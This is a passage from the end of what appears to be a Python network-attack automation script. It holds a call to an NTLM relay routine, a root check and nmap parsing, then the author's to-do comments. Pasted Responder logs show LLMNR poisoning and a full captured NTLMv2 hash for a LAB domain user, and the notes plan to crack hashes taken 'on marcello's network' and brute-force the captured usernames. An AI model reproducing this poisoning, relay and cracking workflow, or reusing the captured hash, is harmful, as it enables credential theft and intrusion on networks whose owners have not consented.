        do_ntlmrelay(identifier, prev_creds, args)

if __name__ == "__main__":
    args = parse_args()
    if os.geteuid():
        exit('[-] Run as root')
    report = parse_nmap(args)
    main(report, args)


# WHERE I LEFT OFF
    # TO DO
    # why does john not crack the hashes responder captured on marcello's network; check phone pictures for paste

#    # quick 2 password bruteforce on responder usernames
#01/04/2018 10:36:46 PM - [*] [LLMNR]  Poisoned answer sent to 10.1.0.97 for name fdsfdsffdfffFDFDfdsafdfdf
#01/04/2018 10:36:47 PM - [*] Skipping previously captured hash for LAB\dan.da
#01/04/2018 10:36:47 PM - [*] Skipping previously captured hash for LAB\dan.da
#01/04/2018 10:36:53 PM - [*] [LLMNR]  Poisoned answer sent to 10.1.0.97 for name fdsfdsffdfffFDFDfdsafdfdf
#01/04/2018 10:36:55 PM - [SMBv2] NTLMv2-SSP Client   : 10.1.0.97
#01/04/2018 10:36:55 PM - [SMBv2] NTLMv2-SSP Username : LAB\me
#01/04/2018 10:36:55 PM - [SMBv2] NTLMv2-SSP Hash     : me::LAB:4408ea9ea58cb4fd:C4828263E213E1243EE286E5BBC0D981:0101000000000000C0653150DE09D20169FBA08A845E70F6000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000100000000200000C64FC9FA1A1FBC490AF573DFAE78E3766AD131888F77120D8DDFD12A1530CA460A0010000000000000000000000000000000000009003C0063006900660073002F006600640073006600640073006600660064006600660066004600440046004400660064007300610066006400660064006600000000000000000000000000
#01/04/2018 10:36:55 PM - [*] [LLMNR]  Poisoned answer sent to 10.1.0.97 for name fdsfdsffdffffdfdfdsafdfdf
#

    #  left off line 846
